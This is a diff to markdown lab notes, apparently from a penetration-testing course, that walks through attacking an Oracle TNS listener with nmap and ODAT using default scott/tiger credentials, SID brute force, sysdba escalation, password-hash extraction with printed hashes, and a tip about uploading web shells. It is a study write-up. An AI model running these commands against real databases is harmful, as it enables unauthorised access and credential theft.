@@ -580,41 +580,107 @@ LOGSTDBY_ADMINISTRATOR
 
 ---
 
-## File Upload via ODAT
+## Practical Lab: Full Oracle TNS Attack Workflow
 
-Upload files to the target system (requires knowing web root path).
+> Target: 10.129.205.19 | SID: XE | Creds: scott/tiger
 
-### Default Web Root Paths
-
-| OS | Path |
-|----|------|
-| **Linux** | `/var/www/html` |
-| **Windows** | `C:\inetpub\wwwroot` |
-
-### Test File Upload
+### Step 1: Nmap - Confirm Oracle TNS is Running
 
 ```bash
-# Create test file
-echo "Oracle File Upload Test" > testing.txt
-
-# Upload via ODAT
-./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
+sudo nmap -p1521 -sV 10.129.205.19 --open
 ```
 
-```
-[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server
-[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
-```
-
-### Verify Upload
+### Step 2: SID Bruteforce with ODAT
 
 ```bash
-curl -X GET http://10.129.204.235/testing.txt
+cd ~/odat && source venv/bin/activate
+python3 odat.py sidguesser -s 10.129.205.19 -p 1521
 ```
 
+Result: Massive SID dump including `XE`, `ORCL`, `PROD`, `DB`, and hundreds more.
+
+### Step 3: Test Modules Without sysdba (Limited Access)
+
+```bash
+python3 odat.py all -s 10.129.205.19 -p 1521 -d XE -U scott -P tiger
 ```
-Oracle File Upload Test
+
+Result: Almost everything returned **KO** - `scott/tiger` only has CONNECT and RESOURCE roles.
+
+### Step 4: Test Modules WITH sysdba (Full Access)
+
+```bash
+python3 odat.py all -s 10.129.205.19 -p 1521 -d XE -U scott -P tiger --sysdba
 ```
+
+Result: Nearly everything returned **OK**:
+
+| Module | Without sysdba | With sysdba |
+|--------|---------------|-------------|
+| **TNS Poisoning (CVE-2012-1675)** | VULNERABLE | VULNERABLE |
+| **UTL_HTTP** | KO | OK |
+| **HTTPURITYPE** | KO | OK |
+| **UTL_FILE** | KO | OK |
+| **DBMSADVISOR** | KO | OK |
+| **DBMSSCHEDULER** | KO | OK |
+| **CTXSYS** | KO | OK |
+| **Hashed passwords** | KO | OK |
+| **Password history** | KO | OK |
+| **DBMS_XSLPROCESSOR** | KO | OK |
+| **External table read** | KO | OK |
+| **External table exec** | KO | OK |
+| **DBMS_LOB read files** | KO | OK |
+| **SMB capture** | KO | Perhaps |
+| **Priv esc (CREATE/EXECUTE ANY)** | KO | OK |
+| **Priv esc (CREATE ANY INDEX)** | KO | OK |
+
+### Step 5: Extract All Password Hashes
+
+```bash
+python3 odat.py passwordstealer -s 10.129.205.19 -d XE -U scott -P tiger --sysdba --get-passwords
+```
+
+Result: All Oracle password hashes extracted:
+
+```
+SYS; FBA343E7D6C8BC9D
+SYSTEM; B5073FE1DE351687
+OUTLN; 4A3BA55E08595C81
+DIP; CE4A36B8E06CA59C
+ORACLE_OCM; 5A2E026A9157958C
+DBSNMP; E066D214D5421CCC
+APPQOSSYS; 519D632B7EE7F63A
+CTXSYS; D1D21CA56994CAB6
+XDB; E76A6BD999EF9FF1
+ANONYMOUS; anonymous
+XS$NULL; DC4FCC8CB69A6733
+MDSYS; 72979A94BAD2AF80
+HR; 4C6D73C3E8B0F0DA
+FLOWS_FILES; 30128982EA6D4A3D
+APEX_PUBLIC_USER; 4432BA224E12410A
+APEX_040000; E7CE9863D7EEB0A4
+SCOTT; F894844C34402B67
+```
+
+ODAT also formats hashes for cracking tools:
+
+```
+# oclHashcat format
+E066D214D5421CCC:DBSNMP
+
+# John the Ripper format
+DBSNMP:E066D214D5421CCC
+```
+
+### Lab Summary
+
+| Phase | Tool/Command | Result |
+|-------|-------------|--------|
+| **Discovery** | `nmap -p1521 -sV` | Oracle TNS 11.2.0.2.0 |
+| **SID Enum** | `odat.py sidguesser` | Hundreds of SIDs found (XE, ORCL, etc.) |
+| **Auth (low priv)** | `odat.py all` without `--sysdba` | Most modules blocked |
+| **Auth (high priv)** | `odat.py all` with `--sysdba` | Full access - file read/write, command exec |
+| **Hash Extraction** | `odat.py passwordstealer --get-passwords` | 17 password hashes extracted |
 
 ---
 
@@ -627,8 +693,9 @@ Oracle File Upload Test
 5. **ODAT is essential** - Comprehensive tool for Oracle enumeration and exploitation
 6. **Common credentials** - `scott/tiger` is a classic default Oracle account
 7. **Try sysdba** - Even low-priv users may connect as sysdba for full access
-8. **Extract hashes** - `select name, password from sys.user$` for offline cracking
+8. **Extract hashes** - Use `--get-passwords` for crackable hash formats
 9. **File upload** - Use ODAT utlfile module to upload web shells if web server exists
+10. **Always compare** - Run ODAT with and without `--sysdba` to see the privilege difference
 
 ---
 
